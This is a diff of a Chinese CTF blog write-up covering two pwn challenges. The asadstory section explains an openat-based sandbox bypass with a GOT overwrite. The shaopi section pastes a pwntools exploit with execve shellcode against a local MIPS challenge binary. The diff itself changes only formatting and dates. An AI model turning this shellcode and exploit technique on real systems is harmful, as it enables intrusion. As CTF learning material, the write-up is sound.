@@ -6,15 +6,15 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="DBS and TPDBSCTF CBCTF 2023 11月asadstory主要有两个难点： 1.程序关闭了标准输出，可以利用标准错误来实现输出。2.沙盒禁用了read函数，可以使用openat()来打开文件，注意openat函数的用法格式 12345openat():openat(int fd,const char *path,int oflag,...);&#x2F;&#x2F;fd&#x3D;AT_FDCWD(指代当">
+    <meta name="description" content="DBS and TPDBSCTF CBCTF 2023 11月asadstory主要有两个难点： 1.程序关闭了标准输出，可以利用标准错误来实现输出。2.沙盒禁用了read函数，可以使用***openat()来打开文件，注意openat***函数的用法格式 12345openat():openat(int fd,const char *path,int oflag,...);&#x2F;&#x2F;fd&#x3D;AT_FDC">
 <meta property="og:type" content="article">
 <meta property="og:title" content="DBASCTF And TPCTF">
 <meta property="og:url" content="http://example.com/2023/12/01/DBASCTF-And-TPCTF/index.html">
 <meta property="og:site_name" content="n0we11&#39;s learning blog">
-<meta property="og:description" content="DBS and TPDBSCTF CBCTF 2023 11月asadstory主要有两个难点： 1.程序关闭了标准输出，可以利用标准错误来实现输出。2.沙盒禁用了read函数，可以使用openat()来打开文件，注意openat函数的用法格式 12345openat():openat(int fd,const char *path,int oflag,...);&#x2F;&#x2F;fd&#x3D;AT_FDCWD(指代当">
+<meta property="og:description" content="DBS and TPDBSCTF CBCTF 2023 11月asadstory主要有两个难点： 1.程序关闭了标准输出，可以利用标准错误来实现输出。2.沙盒禁用了read函数，可以使用***openat()来打开文件，注意openat***函数的用法格式 12345openat():openat(int fd,const char *path,int oflag,...);&#x2F;&#x2F;fd&#x3D;AT_FDC">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-12-01T13:05:55.597Z">
-<meta property="article:modified_time" content="2023-12-01T13:05:55.702Z">
+<meta property="article:modified_time" content="2023-12-01T13:31:42.417Z">
 <meta property="article:author" content="n0we11">
 <meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
@@ -161,7 +161,7 @@
 
   <div class="content e-content" itemprop="articleBody">
     <h2 id="DBS-and-TP"><a href="#DBS-and-TP" class="headerlink" title="DBS and TP"></a>DBS and TP</h2><h3 id="DBSCTF-CBCTF-2023-11月"><a href="#DBSCTF-CBCTF-2023-11月" class="headerlink" title="DBSCTF CBCTF 2023 11月"></a>DBSCTF CBCTF 2023 11月</h3><h4 id="asadstory"><a href="#asadstory" class="headerlink" title="asadstory"></a>asadstory</h4><p>主要有两个难点：</p>
-<p>1.程序关闭了标准输出，可以利用标准错误来实现输出。<br>2.沙盒禁用了read函数，可以使用<em><strong>openat()<em><strong>来打开文件，注意</strong></em>openat</strong></em>函数的用法格式</p>
+<p>1.程序关闭了标准输出，可以利用标准错误来实现输出。<br>2.沙盒禁用了read函数，可以使用***<u>openat()</u><em><strong>来打开文件，注意</strong></em><u>openat</u>***函数的用法格式</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">openat():</span><br><span class="line">openat(<span class="type">int</span> fd,<span class="type">const</span> <span class="type">char</span> *path,<span class="type">int</span> oflag,...);</span><br><span class="line"><span class="comment">//fd=AT_FDCWD(指代当前目录，宏定义值为-100)</span></span><br><span class="line"><span class="comment">//*path指向文件路径，指定路径的文件通过读/写打开    ‘./flag’</span></span><br><span class="line"><span class="comment">//oflag,能够指定一个不存在的文件并创建             0</span></span><br></pre></td></tr></table></figure>
 
 <p>然后,就是改got表中read为syscall,调用write标准错误输出libc，然后orw。</p>
@@ -169,7 +169,7 @@
 
 
 
-<h4 id="shaopi"><a href="#shaopi" class="headerlink" title="shaopi"></a>shaopi</h4><p>好像是<em><strong>MIPS</strong></em> Pwn,要看得懂汇编<br>。。。。。。后续看<br>先贴一段别人的exp:</p>
+<h4 id="shaopi"><a href="#shaopi" class="headerlink" title="shaopi"></a>shaopi</h4><p>好像是<u><em><strong>MIPS</strong></em></u> Pwn,要看得懂汇编<br>。。。。。。后续看<br>先贴一段别人的exp:</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;mips&#x27;</span>, endian = <span class="string">&#x27;little&#x27;</span>)</span><br><span class="line">sh = process([<span class="string">&quot;qemu-mipsel&quot;</span>,<span class="string">&quot;./challenge&quot;</span>])</span><br><span class="line"><span class="comment"># sh = gdb.debug(&quot;./challenge&quot;, &#x27;b *0x00400CB4&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0043965C | addiu $a2,$sp,0x68+var_10 | jalr $fp</span></span><br><span class="line"><span class="comment"># 0x0040ABB8 | move $t9,$a2 | jalr $a2</span></span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">&#x27;your passphrase: &#x27;</span>, <span class="string">&#x27;三元一串十元三串&#x27;</span>)</span><br><span class="line"><span class="comment"># shellcode = asm(shellcraft.mips.linux.sh())</span></span><br><span class="line"><span class="comment"># execve(&quot;/bin//sh&quot;, 0, 0)</span></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">lui $t6,0x6e69</span></span><br><span class="line"><span class="string">ori $t6,$t6,0x622f</span></span><br><span class="line"><span class="string">sw $t6,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">lui $t7,0x6873</span></span><br><span class="line"><span class="string">ori $t7,$t7,0x2f2f</span></span><br><span class="line"><span class="string">sw $t7,32($sp)</span></span><br><span class="line"><span class="string">sw $zero,36($sp) </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">la $a0,28($sp)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">addiu $a1,$zero,0</span></span><br><span class="line"><span class="string">addiu $a2,$zero,0</span></span><br><span class="line"><span class="string">addiu $v0,$zero,4011</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">syscall 0x40404</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">shellcode = asm(shellcode)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(shellcode)))</span><br><span class="line">pld = cyclic(<span class="number">0x40</span>) + p32(<span class="number">0x0040ABB8</span>) + p32(<span class="number">0x0043965C</span>)</span><br><span class="line">pld = pld.ljust(<span class="number">0xa0</span>, <span class="string">b&#x27;a&#x27;</span>) + shellcode</span><br><span class="line">sh.sendafter(<span class="string">&#x27;Congratulation!\n&#x27;</span>, pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
 
@@ -240,7 +240,7 @@
     Copyright &copy;
     
     
-    2016-2023
+    2016-2024
     n0we11
   </div>
   <div class="footer-right">
